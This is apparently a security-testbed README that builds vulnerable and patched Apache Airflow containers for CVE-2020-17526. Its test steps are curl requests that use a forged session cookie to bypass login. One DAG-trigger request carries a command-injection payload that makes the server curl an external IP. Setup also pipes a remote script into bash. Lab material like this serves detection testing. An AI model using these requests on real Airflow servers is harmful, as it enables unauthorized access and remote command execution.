# requirements setup
spin up an `Ubuntu 22.04` fresh instance and log in as root.
```bash
apt update
apt install dos2unix
wget -q -O - "https://get.docker.com/" | dos2unix | bash
# clone the repo
# cd security-testbeds/apache/airflow/CVE-2020-17526
```
# setup Vulnerable instance
## Initialize the database
```bash
docker compose -f docker-compose-vulnerable.yml run airflow-init
```
## Start service
```bash
docker compose -f docker-compose-vulnerable.yml up -d
```
## test the exploit
### simple test
```bash
curl 'http://127.0.0.1:8080/admin/' -H 'Cookie: session=eyJfZnJlc2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlLCJ1c2VyX2lkIjoiMSJ9.ZgdmZA.GDwzAupY1c9AXYDbLRvjSiZCVw0'
```
in a successfull exploitation, you should not be redirected to login page. on the other hand, you should receive the list of DAGs.
### test with OOB
```bash
curl 'http://127.0.0.1:8080/admin/airflow/paused?is_paused=true&dag_id=example_trigger_target_dag' -X POST -H 'Cookie: session=eyJfZnJlc2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlLCJ1c2VyX2lkIjoiMSJ9.ZgdmZA.GDwzAupY1c9AXYDbLRvjSiZCVw0'
curl 'http://127.0.0.1:8080/admin/airflow/trigger?dag_id=example_trigger_target_dag&origin=%2Fadmin%2Fairflow%2Ftree%3Fdag_id%3Dexample_trigger_target_dag'  -X POST -H 'Cookie: session=eyJfZnJlc2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlLCJ1c2VyX2lkIjoiMSJ9.ZgdmZA.GDwzAupY1c9AXYDbLRvjSiZCVw0' --data-raw 'csrf_token=IjMwMzE3MTZhNmQwZDUzYmI1YTliZDVkZTU5OTU2MGUzMTgzMGY2ZTEi.Zgdpdw.W1SJwF614zKdcf6HhQRT65ZmOFI&dag_id=example_trigger_target_dag&origin=%2Fadmin%2Fairflow%2Ftree%3Fdag_id%3Dexample_trigger_target_dag&conf=%7B%22message%22%3A%22%60curl+95.217.16.117%3A1234%60%22%7D'
```
# setup secure instance
## Initialize the database
```bash
docker compose -f docker-compose-secure.yml run airflow-init
```
## Start service
```bash
docker compose -f docker-compose-secure.yml up -d
```

Ref:
https://github.com/vulhub/vulhub/tree/master/airflow/CVE-2020-17526
